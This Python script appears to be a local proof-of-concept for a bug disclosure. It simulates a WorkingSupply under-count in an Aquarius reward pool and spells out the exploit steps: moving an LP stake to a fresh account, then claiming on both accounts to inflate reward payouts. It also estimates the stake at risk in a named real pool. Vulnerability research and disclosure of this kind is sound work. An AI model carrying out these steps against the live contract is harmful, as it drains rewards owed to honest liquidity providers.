#!/usr/bin/env python3
"""
LOCAL PoC — Aquarius reward WorkingSupply under-count.
Faithfully reproduces the decompiled integer arithmetic of the pool reward path:
  f156 (get/init WorkingBalance), f197 (WS += new_wb - old_wb), f273 (inv = 1e22*gen/WS), f159 (reward = wb*inv/1e22)
No network. Pure integer math (Python ints are exact; // is floor, matching u256_div/u256_mul flooring).

The ONLY thing that differs between the two runs is f156's fresh-user return value:
  BUGGY   : returns the caller-supplied balance as old_wb   (matches decompiled f156 lines 12721-12731)
  CORRECT : returns 0 as old_wb                             (textbook gauge accounting)
Everything else is identical. If only that line matters, it isolates the bug as the cause.
"""

SCALE = 10**22  # f109(1864712049423024128,542) == 1e22, verified in decompile

class Pool:
    def __init__(self, buggy):
        self.buggy = buggy
        self.WB = {}            # WorkingBalance[user]           (persistent key Vec[Symbol("WorkingBalance"),user])
        self.WS = 0             # running WorkingSupply          (instance key 1050248)
        self.bal = {}           # user's REAL LP share balance   (read via f85 cross-contract balance())

    # f204: working balance for a user given their share balance.
    # No-boost model: new_wb == balance (the min working balance with no veAQUA boost).
    # NOTE: with a boost curve new_wb would scale, but the WS under-count below is exactly
    # `balance` regardless of new_wb (it comes from old_wb, not new_wb) — see assert at end.
    def f204(self, user, balance):
        return balance

    # f156: return old working balance. Fresh user -> BUG returns `balance` instead of 0.
    def f156(self, user, balance):
        if user in self.WB:
            return self.WB[user]           # existing: stored value
        # fresh-user branch (decompiled f156 12721-12731): stores WB=balance and RETURNS balance
        return balance if self.buggy else 0

    # f197: WS += new_wb - old_wb ; WB[user] = new_wb    (decompiled f197 14547-14577)
    def f197(self, user, balance):
        old_wb = self.f156(user, balance)
        new_wb = self.f204(user, balance)
        self.WS += new_wb - old_wb
        self.WB[user] = new_wb

    # deposit: two-step checkpoint (pre-mint balance, then post-mint) — the SAFE path
    def deposit(self, user, amount):
        b0 = self.bal.get(user, 0)
        self.f197(user, b0)                # checkpoint at OLD balance (0 for first deposit)
        self.bal[user] = b0 + amount       # mint shares
        self.f197(user, self.bal[user])    # checkpoint at NEW balance

    # raw LP-token transfer (SEP-41) — moves balances; no pool checkpoint (share token is a separate contract)
    def transfer(self, frm, to, amount):
        self.bal[frm] -= amount
        self.bal[to] = self.bal.get(to, 0) + amount

    # claim: pool reads REAL balance (f85) then single-step checkpoints the user (the reachable trigger)
    def claim(self, user):
        self.f197(user, self.bal.get(user, 0))

    # one reward period of `generated` tokens: inv=1e22*gen//WS (f273); reward_i = wb_i*inv//1e22 (f159)
    def distribute(self, generated):
        if self.WS <= 0:
            return {u: 0 for u in self.WB}, 0  # WS<=0 -> inv path returns 0 (or would trap); no payout
        inv = (SCALE * generated) // self.WS
        rewards = {u: (wb * inv) // SCALE for u, wb in self.WB.items() if wb > 0}
        return rewards, sum(rewards.values())

def run(buggy, exploit):
    p = Pool(buggy)
    C = 1_000_000_0000000          # Carol: 1,000,000 LP (7 dp)
    A = 1_000_000_0000000          # Attacker: equal stake
    p.deposit("carol", C)
    p.deposit("atk0",  A)
    if exploit:
        p.transfer("atk0", "atk1", A)  # move whole stake to a fresh account
        p.claim("atk1")                 # fresh account's first checkpoint at balance A  <-- hits fresh-init
        p.claim("atk0")                 # correct atk0 down to 0 (removes its WS contribution)
    generated = 100_000_0000000      # 100,000 AQUA emitted this period
    rewards, total = p.distribute(generated)
    return p, rewards, total, generated

print("="*74)
for label, buggy, exploit in [("BUGGY   / honest (no exploit)", True,  False),
                              ("BUGGY   / EXPLOIT",             True,  True ),
                              ("CORRECT / EXPLOIT (same steps)",False, True )]:
    p, rewards, total, gen = run(buggy, exploit)
    atk = rewards.get("atk1",0)+rewards.get("atk0",0)
    over = total - gen
    print(f"{label:32}| WS={p.WS:>16} | paid={total/1e7:>12,.0f} | funded={gen/1e7:>10,.0f} "
          f"| over={over/1e7:>+11,.0f} | atk={atk/1e7:>11,.0f}")
print("="*74)

# monetary impact against the largest real pool (reserve measured earlier, no network here)
CA6PUJLB_reserve_aqua = 91_405_936         # (configured-claimed)/1e7 for pool CA6PUJLB
AQUA_USD = 0.000398
p,_,total,gen = run(True, True)
over_frac = (total-gen)/gen
print(f"\nExploit over-distribution rate (attacker stake == honest stake): +{over_frac*100:.0f}% of each emission period")
print(f"Cap per pool = outstanding reward reserve. Largest pool CA6PUJLB: "
      f"{CA6PUJLB_reserve_aqua:,} AQUA ~= ${CA6PUJLB_reserve_aqua*AQUA_USD:,.0f}")

# formula-independence of the under-count: WS deficit == attacker's moved balance, for ANY new_wb formula
print("\nInvariant check (undercount == moved balance, independent of boost formula):")
for factor in [1.0, 0.4, 2.5]:
    class P2(Pool):
        def f204(self, u, b): return int(b*factor)
    q=P2(True); C=A=1_000_000_0000000
    q.deposit("carol",C); q.deposit("a0",A); q.transfer("a0","a1",A); q.claim("a1"); q.claim("a0")
    correct_WS = int(C*factor)+int(A*factor)   # what WS should be if a1 counted
    print(f"  new_wb={factor}x -> WS={q.WS/1e7:,.0f}  correct={correct_WS/1e7:,.0f}  deficit={ (correct_WS-q.WS)/1e7:,.0f} (== attacker {A/1e7:,.0f})")
